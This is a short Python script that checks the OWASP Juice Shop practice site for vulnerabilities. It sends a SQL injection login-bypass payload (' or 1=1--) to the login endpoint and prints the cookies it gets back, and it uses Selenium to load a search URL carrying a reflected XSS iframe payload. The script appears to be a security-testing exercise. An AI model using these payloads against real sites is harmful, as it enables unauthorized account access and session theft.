import requests
from selenium import webdriver
import time

def check_false(uri):
    data1 = {
        "email":"test",
        "password":"test"
        }
    req = requests.post(uri, data=data1)
    return(req.text == "Invalid email or password.")
def check_sqli(uri):
    data2 = {
    "email": "' or 1=1--",
    "password": "a"
    }
    req = requests.post(uri, data=data2)
    for cookie in req.cookies:
        print(cookie)
    return("authentication" in req.text and "token" in req.text)

def check_xss(uri):
    options = webdriver.ChromeOptions()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    driver = webdriver.Chrome(options=options)
    driver.get(uri)
    time.sleep(5)
    try:
        alert = driver.switch_to.alert
        if alert.text == 'xss detected':
            return True
        else:
            return False
    except Exception as e:
        return False


uri = "https://juice-shop.herokuapp.com/rest/user/login"
print(f"Website is responsive: {check_false(uri)}")
print(f'Website is vulnerable to SQLI: {check_sqli(uri)}')
uri2 = "https://juice-shop.herokuapp.com/#/search?q=%3Ciframe%20src%3D%22javascript:alert(%60xss%20detected%60)%22%3E"
print(f'Website is vulnerable to reflected XSS: {check_xss(uri2)}')